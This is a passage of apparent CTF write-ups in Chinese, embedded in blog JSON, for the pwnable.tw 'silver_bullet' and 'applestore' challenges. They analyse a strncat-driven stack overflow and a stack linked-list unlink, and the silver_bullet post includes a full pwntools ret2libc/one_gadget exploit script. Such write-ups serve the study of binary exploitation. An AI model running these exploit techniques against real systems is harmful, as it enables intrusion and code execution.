src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%8810.13.37.png\" alt=\"截屏2022-04-28 下午10.13.37\"></p>\n<p>​        加上recv的话有时候会打不来，有时又可以。总之就是这个环境非常的离奇，如果本地打得通远端打不通建议多试几次。</p>\n","categories":["Binary_security"],"tags":["STACK - Other"]},{"title":"pwnable - silver_bullet","url":"/2022/04/28/week9_4.1_silver_bullet/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-uKCMoaEj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%8810.35.16.png\" alt=\"截屏2022-04-28 下午10.35.16\"></p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        好，还有符号表，真好。这个题比较怪，这是一个菜单题，但是却是栈题。</p>\n<p>​        好像还是个简单的小游戏。</p>\n<h2><span id=\"create_bullet\">create_bullet</span></h2><p>​        这个逻辑看来也是只能创建一个bullet这样。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *bullet_list )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You have been created the Bullet !&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Give me your description of bullet :&quot;</span>);</span><br><span class=\"line\">read_input(bullet_list, <span class=\"number\">0x30</span>u);<span class=\"comment\">//直接在list上输入内容</span></span><br><span class=\"line\">input_size = <span class=\"built_in\">strlen</span>(bullet_list);<span class=\"comment\">//获取input的长度作为size</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your power is : %u\\n&quot;</span>, input_size);<span class=\"comment\">//print size</span></span><br><span class=\"line\">*(bullet_list + <span class=\"number\">12</span>) = input_size;<span class=\"comment\">//将size保存在bullet + 48的地址上。 </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Good luck !!&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        这里就是在 buf + 12*4的地址上保存了size的值，且我们允许的键盘输入是30，所以这里并不会溢出到这个size位。好像没有什么思路了，继续看下一个功能。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8A%E5%8D%888.52.13.png\" alt=\"截屏2022-04-29 上午8.52.13\"></p>\n<h2><span id=\"power_up\">power_up</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">new_num = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !*bullet_list )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You need create the bullet first !&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( *(bullet_list + <span class=\"number\">12</span>) &gt; <span class=\"number\">47u</span> )<span class=\"comment\">//最大其实也只有48个子弹</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class=\"line\">read_input(s, <span class=\"number\">48</span> - *(bullet_list + <span class=\"number\">12</span>));<span class=\"comment\">//可以输入的size是很粗暴的48 - 当前size</span></span><br><span class=\"line\"><span class=\"built_in\">strncat</span>(bullet_list, s, <span class=\"number\">48</span> - *(bullet_list + <span class=\"number\">12</span>));<span class=\"comment\">//然后将新输入的s追加到list后，</span></span><br><span class=\"line\">new_num = <span class=\"built_in\">strlen</span>(s) + *(bullet_list + <span class=\"number\">12</span>);<span class=\"comment\">//并重新计算子弹数量</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your new power is : %u\\n&quot;</span>, new_num);<span class=\"comment\">//输出</span></span><br><span class=\"line\">*(bullet_list + <span class=\"number\">12</span>) = new_num;<span class=\"comment\">//保存</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enjoy it !&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        在乱输入的时候发现了诡异的bug，</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8A%E5%8D%889.06.54.png\" alt=\"截屏2022-04-29 上午9.06.54\"></p>\n<p>​        先留着，看看最后一个功能。</p>\n<h2><span id=\"beat\">beat</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;&gt;----------- Werewolf -----------&lt;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot; + NAME : %s\\n&quot;</span>, *(a2 + <span class=\"number\">4</span>));<span class=\"comment\">//gin</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot; + HP : %d\\n&quot;</span>, *a2);<span class=\"comment\">//7fff ffff</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;&gt;--------------------------------&lt;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Try to beat it .....&quot;</span>);</span><br><span class=\"line\">    *a2 -= *(bullet_list + <span class=\"number\">48</span>); <span class=\"comment\">//hp = hp - size</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *a2 &lt;= <span class=\"number\">0</span> )<span class=\"comment\">//hp等于0就赢了，但是赢了有啥用</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Oh ! You win !!&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里也没啥好说的，我们就是希望子弹的数量大于7fff ffff，比如说-1，或者嗯大于这个数。但是事实上比起如何让数量达到条件，我更关心的是这样费力赢了有啥用捏。赢也没有给我们任何后门或者金手指,再不济来个leak吧（（</p>\n<h1><span id=\"利用思路\">利用思路</span></h1><p>​        逆完了，但是并没有清晰的思路，只有很多疑点。</p>\n<ol>\n<li>打赢狼人的意义何在</li>\n<li>powerup是否存在整数溢出，是否存在内存泄露</li>\n</ol>\n<p>​        首先第一个问题可以看到，唯一的区别就是win之后返回的是1，也就是main retrun 0 。恕我无能，我觉得没有区别，要硬说区别,我觉得是如果不赢就不能覆盖返回地址劫持执行流？</p>\n<p>​        第二个，我觉得这个题的突破点就在此。可以动调测试一下。</p>\n<p>​        现在数量是0x28，也就是40，但是当我们power up 一个8size的description。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8A%E5%8D%889.26.42.png\" alt=\"截屏2022-04-29 上午9.26.42\"></p>\n<p>​        </p>\n<p>​        非常神奇的事情就发生了。</p>\n<p>​        我初步猜测是这个strncat的时候把空字节覆盖到了size上，然后因为new num的添加在函数的最后，所以我看到的就是我最后输入的power up的值。</p>\n<p>​        确实是这样。这是刚刚strncat后，stack的样子。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8A%E5%8D%889.43.00.png\" alt=\"截屏2022-04-29 上午9.43.00\"></p>\n<p>​        这样思路就清晰了，我们的num被刷新成了一个较小的size，而power up并不是在原来的buf上覆盖数据，而是追加新的字符串，这样就能够进行覆盖。然后直接栈溢出，快乐rop。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8A%E5%8D%889.44.46.png\" alt=\"        \"></p>\n<p>​        写到这里大概用了一个小时，思路基本没有卡过，其实不算很慢。因为写其实用了很久，但是比较矛盾，如果我只看不写可能思路不是非常清晰。还有就是其实这里之所以思路比较连贯主要是我那个乱输发现的bug给我提供了一个定向的思考方向，但是如果没有发现这个问题呢？以我的眼力看出那个strncat的概率又有多大呢？</p>\n<p>​        一方面是眼里还是不够好，另一方面如果其实“乱输”不失为一种解题的方式，只是像我这样随机地，人为地乱输成功率确实难以保障，所以也许我们需要一套比较完整的体系来fuzz出任意简单题的bug点。所以这也是我对于fuzz比较感兴趣的原因，然而这种简单的洞fuzz还是太小题答做了。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​            通过刚才的分析，其实题目利用的思路已经非常清楚了，就是首先create子弹的时候填为47，power up时增加一颗子弹，使得子弹的数量被刷新为1。接着就可以在bulllet + 0x48之后的地址覆盖数据，实现栈溢出。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%882.55.48.png\" alt=\"截屏2022-04-29 下午2.55.48\"></p>\n<p>​            稍微测试一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%883.05.58.png\" alt=\"截屏2022-04-29 下午3.05.58\"></p>\n<p>​        然后问题就是这里应该是ret2libc，而不是ret2syscall。gadget好像不是很多，那就libc试一下。</p>\n<p>​        大概程序流劫持已经没有问题了,这里确实印证了我的猜想，只有当赢的时候才能返回，所以需要覆盖num大于7fffffff，但是需要注意的是如果无脑把num覆盖为ffffffff的话会导致num判断已经大于48，以至于无法输入后面的内容。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">create_bullet(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">47</span>)</span><br><span class=\"line\">power_up(<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\xff&quot;</span>*<span class=\"number\">3</span>  + p32(addr) * <span class=\"number\">5</span></span><br><span class=\"line\">power_up(payload)</span><br><span class=\"line\">beat()</span><br><span class=\"line\"><span class=\"comment\">#power_up(p64(0x200)+ p64(0) + p64(addr))</span></span><br><span class=\"line\">gdb.attach(p)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%883.26.08.png\" alt=\"截屏2022-04-29 下午3.26.08\"></p>\n<p>​        不管了，随便溢了。就是普通的ret2libc，能够leak system，然后第二次劫持执行流跳转到system，或者onegadget上。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%884.41.55.png\" alt=\"截屏2022-04-29 下午4.41.55\"></p>\n<p>​        这里地址如此诡异主要是加载了程序给我的libc。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./silver_bullet&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;./libc_32.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./silver_bullet&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;chall.pwnable.tw&quot;,10107)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>) </span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">addr = <span class=\"number\">0x80488C1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create_bullet</span>(<span class=\"params\">data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Give me your description of bullet :&quot;</span>)</span><br><span class=\"line\">\tp.send(data)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your power is :&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">power_up</span>(<span class=\"params\">data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;bullet :&quot;</span>)</span><br><span class=\"line\">\tp.send(data)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;power is :&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">beat</span>():</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recv()</span><br><span class=\"line\">\t</span><br><span class=\"line\">create_bullet(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">47</span>)</span><br><span class=\"line\">power_up(<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rop =  p32(puts_plt)</span><br><span class=\"line\">rop += p32(addr)</span><br><span class=\"line\">rop += p32(libc_start_main_got)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\xff&quot;</span>*<span class=\"number\">3</span>  + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span> + rop</span><br><span class=\"line\">power_up(payload)</span><br><span class=\"line\">beat()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;You win !!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u32(p.recv()[<span class=\"number\">1</span>:<span class=\"number\">5</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_start_main_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_start_main_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main_addr - libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.symbols[&#x27;str_bin_sh&#x27;]</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"><span class=\"comment\">#log.success(&quot;binsh_addr =&gt; &#123;&#125;&quot;.format(hex(binsh_addr)))</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">one_gadget = libc_base  + <span class=\"number\">0x3a81</span></span><br><span class=\"line\"><span class=\"comment\">#0x5f065</span></span><br><span class=\"line\"><span class=\"comment\">#0x5f066</span></span><br><span class=\"line\">create_bullet(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">47</span>)</span><br><span class=\"line\">power_up(<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\xff&quot;</span>*<span class=\"number\">3</span>  + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span> + p32(one_gadget)</span><br><span class=\"line\">power_up(payload)</span><br><span class=\"line\">beat()</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        这个环境好像有问题。</p>\n<h2><span id=\"一点简单的感想\">一点简单的感想</span></h2><p>​        这个题我现在只觉得非常简单。但是就算是这样的简单题做了两个小时，逆向花了一些时间，但是明明题目逻辑非常简单。我是废物。我觉得这种题应该是可以秒的。</p>\n","categories":["Binary_security"],"tags":["STACK - Other"]},{"title":"pwnable - applestore","url":"/2022/04/29/week9_5.1_pwnable---apple%20store/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-gIQKzLVy\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        怎么这么多32位的。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%886.13.34.png\" alt=\"截屏2022-04-29 下午6.13.34\"></p>\n<p>​        这个题我去年暑假的时候就做过，但是当时明显超出了我的能力范围，属于是wp都看不懂。不过pwnable这几个题目前来说我都能独立完成，所以这个也说不定。</p>\n<p>​        总觉得我现在做题的类型很怪。</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        还是没有去除符号表，好。我依稀记得去年八月的时候我觉得这个题非常难逆，然后是实现了一个双链表。</p>\n<h2><span id=\"main\">main</span></h2><p>​        初始化了bss段上的myCart链表。</p>\n<h2><span id=\"add_item\">add_item</span></h2><p>​        比较主要的函数就是create以及insert。add函数针对每一个商品都建立了一个switch case，以iphone 6 为例，create函数创建了一个0x10size的chunk，并且把‘iphone6’字符串格式化输入到<code>v3[0]</code>，以及把对应价钱的值保存在<code>v3[1]</code>，其他字段置0，最后返回v3这个指针。</p>\n<p>​        接着就是<code>insert</code>函数，传入item list作为参数。整理相当于把刚才创建的商品信息插入到mycart链表中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = &amp;myCart; i[<span class=\"number\">2</span>]; i = i[<span class=\"number\">2</span>] )</span><br><span class=\"line\">  ;</span><br><span class=\"line\">i[<span class=\"number\">2</span>] = item_list;<span class=\"comment\">//在i[2]保存 itlem_list。这里i[2]就是&amp;myCart + 8,0x804b070</span></span><br><span class=\"line\">result = item_list;</span><br><span class=\"line\">*(item_list + <span class=\"number\">12</span>) = i; <span class=\"comment\">//在（&amp;itlem_list + 48）指向的地方保存i[2]</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-29%20%E4%B8%8B%E5%8D%889.04.22.png\" alt=\"截屏2022-04-29 下午9.04.22\"></p>\n<p>​        这里第一个字段指向iphone6这个字符串，第二个字段就是价格。这里item list的地址就是0x804c56c。    所以7c地址就是储存insert操作后写入的<code>mycart</code>的地址。    </p>\n<h2><span id=\"delete\">delete</span></h2><p>​        这个delete函数比较诡异，虽然是delete，但是没有调用任何类似free函数的操作。那么程序是如何实现删除商品的呢？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1 = <span class=\"number\">1</span>;</span><br><span class=\"line\"> v2 = myCart_2_;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Item Number&gt; &quot;</span>);</span><br><span class=\"line\"> fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"> my_read(item_num, <span class=\"number\">0x15</span>u);</span><br><span class=\"line\"> v3 = atoi(item_num);</span><br><span class=\"line\"> <span class=\"keyword\">while</span> ( v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> ( v1 == v3 )                             <span class=\"comment\">// if want to delete the first item</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     v4 = *(v2 + <span class=\"number\">8</span>);                           <span class=\"comment\">// when just add one item ,its equal to 0</span></span><br><span class=\"line\">     v5 = *(v2 + <span class=\"number\">12</span>);                          <span class=\"comment\">// 0</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">       *(v5 + <span class=\"number\">8</span>) = v4;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">       *(v4 + <span class=\"number\">12</span>) = v5;</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Remove %d:%s from your shopping cart.\\n&quot;</span>, v1, *v2);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v7;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   ++v1;</span><br><span class=\"line\">   v2 = *(v2 + <span class=\"number\">8</span>);                             <span class=\"comment\">// In most cases,its equal to 0</span></span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>​        意会一下，就是一个unlink。这里并没有说将什么东西置0，只是替换了指针。</p>\n<p>​        ps : 系统没有装输入法，ida注释强制输入英文了。</p>\n<h2><span id=\"cartampcheckout\">cart&amp;checkout</span></h2><p>​        cart相当于一个show功能，打印加入的商品及价格，然后返回价格总数。比较好玩的事checkout，如果最终的价格等于7174,能够一元购iphone8，购物车链表中插入iphone8对应的数组的指针，其指向iphone8字符串以及价格。</p>\n<p>​        然后这里</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">my_read</span><span class=\"params\">(<span class=\"keyword\">void</span> *buf, <span class=\"keyword\">size_t</span> nbytes)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">ssize_t</span> v3; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = read(<span class=\"number\">0</span>, buf, nbytes);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input Error.&quot;</span>);</span><br><span class=\"line\">  result = buf + v3;</span><br><span class=\"line\">  *(buf + v3) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里咋一看好像没有问题，但是如果和atoi函数结合在一起就又问题了。</p>\n<p>​        atoi会比较输入的buf，但是这里我们可以输入“\\0”来作为atoi的终止符，这样前面的内容没有影响，但是后面我们可以输入任意数据在栈上。</p>\n<p>​    </p>\n<h1><span id=\"利用思路\">利用思路</span></h1><p>​        逆完以后并没有发现明显的漏洞，这里稍微理一下这些指针之间的关系。    </p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-03%20%E4%B8%8B%E5%8D%8810.04.59.png\" alt=\"截屏2022-05-03 下午10.04.59\"></p>\n<p>​        也就是一个双链表，所以如果按照堆题的思路，那么这里就是相当于free的时候没有置0，可以进行unlink造成任意地址写。这里不好想的就是我们没有任何堆块内容的任意写权限，只能将商品的字符串指针储存在链表中，而且我们要思考程序提供给我们的一元购手机的意义在哪。</p>\n<h2><span id=\"漏洞\">漏洞</span></h2><h3><span id=\"1元购提供栈内存\">1元购提供栈内存</span></h3><p>​        而通过上面的思考我们可以确定这道题的堆完全不可控，也就是说这里还是一道如假包换的栈题，我们需要从栈以及相关寄存器的角度去想这件事。</p>\n<p>​        所以这里给出一个iphone8的意图就比较清晰了，仔细看可以发现iphone8对应字符串等是保存在栈上的，而其他的商品都是储存在堆上，这就是给我们提供一块可以利用的栈上的内存，后续我们可以通过它来打印地址等。</p>\n<h3><span id=\"绕过atoi写入数据\">绕过atoi写入数据</span></h3><p>​        关联起之前个atoi的漏洞，我们可以绕过atoi，将我们需要的东西写入buf对应的栈内存。</p>\n<p>​    看一下iphone8的地址，是<code>ebp - 0x20</code>。</p>\n<p>​    然后观察handler下面的几个子函数, ebp  - 0x20左右的位置都储存着我们输入的数据，并且因为是由同一个函数调用，且这里调用时子函数栈帧ebp值都相等。也就是说我们也许可以通过某一个子函数来修改iphone8的数据。具体的函数调用栈相关的知识，这里有一位师傅写的wp特别细，可以看看：<a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/06/applestore/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/06/applestore/</a></p>\n<p>​        这里还有更加简单的方法，cart函数直接根据buf 0 来判断是否打印，所以这里可以直接输入我们想要的东西在“y”之后。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-06%20%E4%B8%8B%E5%8D%8810.11.44.png\" alt=\"截屏2022-05-06 下午10.11.44\"></p>\n<h3><span id=\"栈上的unlink\">栈上的unlink</span></h3><p>​        也就是之前说的，程序创建了一个栈上的双向链表，而free相当于一个unlink操作，并且没有给任何指针置0，必然是有uaf的，所以可以用unlink的思路。</p>\n<h2><span id=\"利用\">利用</span></h2><h3><span id=\"leak\">leak</span></h3><p>​        先申请出一个iphone8,用的是299 <em> 20 + 199</em>6 。</p>\n<p>​        然后再利用某个atoi将iphone8字符串指针改为read got的地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkout()</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;yy&#x27;</span> + p32(read_got_addr)  +  p32(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">cart(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;27: &quot;</span>)</span><br><span class=\"line\">libc_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = libc_addr - libc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br></pre></td></tr></table></figure>\n<h3><span id=\"改got表\">改got表</span></h3><p>​        通过leak以及计算拿到delete函数的ebp地址，利用delete劫持ebp，就能直接覆盖got表。</p>\n<p>​        这里要获得ebp的地址首先需要leak 栈地址，关于leak有两种思路，一个是打印第二十六个节点的fd值，另外一个是根据libc上的environ环境指针leak。</p>\n<h4><span id=\"environ\">environ</span></h4><p>​        可以看到这个指针本身就是指向栈上的，所以我们可以直接拿到栈地址。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-07%20%E4%B8%8B%E5%8D%882.02.46.png\" alt=\"截屏2022-05-07 下午2.02.46\"></p>\n<p><img 